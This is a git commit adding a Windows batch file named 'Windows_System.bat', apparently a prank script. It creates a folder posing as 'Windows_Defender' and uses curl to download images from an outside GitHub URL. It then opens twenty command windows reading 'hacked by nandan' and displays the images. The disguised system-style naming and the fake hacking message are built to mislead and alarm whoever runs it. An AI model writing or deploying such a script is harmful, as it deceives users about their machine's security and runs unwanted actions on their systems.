59811fec354931c080cb6a425b3c03b0562b3f03
huckardidi <124454617+huckardidi@users.noreply.github.com>
2023-02-04 23:21:18 +0530

    Add files via upload

---
+++ Windows_System.bat
@@ -0,0 +1,29 @@
+mkdir C:\Windows_Defender
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/1.gif > C:\Windows_Defender\1.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/2.gif > C:\Windows_Defender\2.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/3.gif > C:\Windows_Defender\3.gif
+curl https://raw.githubusercontent.com/huckardidi/winprank1/main/4.png > C:\Windows_Defender\4.png
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+START CMD /C "ECHO hacked by nandan && PAUSE"
+C:\Windows_Defender\1.gif
+C:\Windows_Defender\2.gif
+C:\Windows_Defender\3.gif
+C:\Windows_Defender\4.png
